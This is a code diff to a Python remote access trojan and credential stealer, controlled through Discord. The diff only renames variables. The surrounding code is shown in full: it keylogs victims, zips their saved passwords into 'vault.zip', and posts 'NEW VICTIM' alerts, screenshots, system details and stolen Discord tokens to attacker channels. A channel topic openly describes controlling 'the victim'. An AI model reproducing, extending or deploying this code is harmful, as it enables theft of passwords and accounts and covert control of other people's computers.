@@ -12,7 +12,7 @@ from pynput.keyboard import Listener
 import winreg
 import aiohttp
 
-zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
+path2volt = os.path.join(os.getenv('APPDATA'), 'vault.zip')
 
 async def spying(bot, channel_id):
     channel = bot.get_channel(channel_id)
@@ -106,7 +106,7 @@ async def updates(bot, channel_id):
             await asyncio.sleep(0.1)
         except:
             continue
-async def send_vault_file(channel):
+async def getvolt(channel):
     vault_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
     if os.path.exists(vault_path):
         try:
@@ -358,12 +358,12 @@ async def run(bot):
     category_name = f'{username}-{pcname}'
     category = await guild.create_category(category_name)
     
-    commands_channel = await guild.create_text_channel(
+    commandzchannel = await guild.create_text_channel(
         f'{username}-{pcname}-commands', 
         category=category,
         topic="this is the main channel for controlling the victim. use .help for a command guide. FYI: the vault.zip contains all the passwords of the victim and can be found at the top of the channel"
     )
-    bot.commands_channel[commands_channel.id] = True
+    bot.commandzchannel[commandzchannel.id] = True
     screenies = await guild.create_text_channel(
         f'{username}-{pcname}-screenshots', 
         category=category,
@@ -385,13 +385,13 @@ async def run(bot):
     asyncio.create_task(start_moonman(bot, keysc.id))
     asyncio.create_task(updates(bot, updateschannel.id))
 
-    await commands_channel.send(f"||@everyone|| NEW VICTIM: {username}!!\n type .help for the list of commands")
+    await commandzchannel.send(f"||@everyone|| NEW VICTIM: {username}!!\n type .help for the list of commands")
     try:
-        await send_vault_file(commands_channel)
+        await getvolt(commandzchannel)
     except FileNotFoundError:
         pass    
-    if os.path.exists(zip_file_path):
-        os.remove(zip_file_path)
+    if os.path.exists(path2volt):
+        os.remove(path2volt)
 
     embed = discord.Embed(title=f"System Information: {pcname}", color=discord.Color.dark_embed())
     procid = subprocess.check_output(["powershell", "-Command", "(Get-WmiObject Win32_ComputerSystemProduct).UUID"], text=True)
@@ -422,9 +422,9 @@ async def run(bot):
         embed.set_author(name=f"{pcname} Log", icon_url="https://repository-images.githubusercontent.com/928484583/1a270996-409f-45f3-8451-a5c965c35ca2")
         embed.timestamp = datetime.now()
         if screenshot_file: 
-            await commands_channel.send(embed=embed, file=screenshot_file)
+            await commandzchannel.send(embed=embed, file=screenshot_file)
         else:
-            await commands_channel.send(embed=embed)
+            await commandzchannel.send(embed=embed)
     for t in token:
         second_embed = discord.Embed(color=discord.Color.purple())
         second_embed.add_field(name="🔑 Discord Token", value=f"```{t if t else 'none'}```", inline=False)
@@ -467,6 +467,6 @@ async def run(bot):
             if pfp_url:
                 second_embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_data['id']}/{pfp_url}.png")
 
-        await commands_channel.send(embed=second_embed)
+        await commandzchannel.send(embed=second_embed)
 
-    return commands_channel
+    return commandzchannel
